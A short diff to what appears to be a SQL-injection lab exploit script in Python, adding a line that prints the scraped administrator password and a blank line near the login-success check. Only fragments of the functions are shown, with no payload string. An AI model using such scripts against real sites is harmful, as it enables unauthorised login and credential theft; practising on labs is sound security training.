@@ -31,6 +31,7 @@ def find_credentials(s, url):
 
     '''
     password = soup.body.find(string="administrator").parent.findNext('td').contents[0] 
+    print("(+) Password of administator is %s" %password)
     return password
     
 
@@ -49,6 +50,7 @@ def exploit_sql_injection(s, url):
     res = s.post(url+path, data=data, verify=False, proxies=proxies)
     if 'Log out' in res.text:
         print("SQL Injection successful.")
+        
         print("you logged in as administrator.")
     else:
         print("SQL Injection failed.")
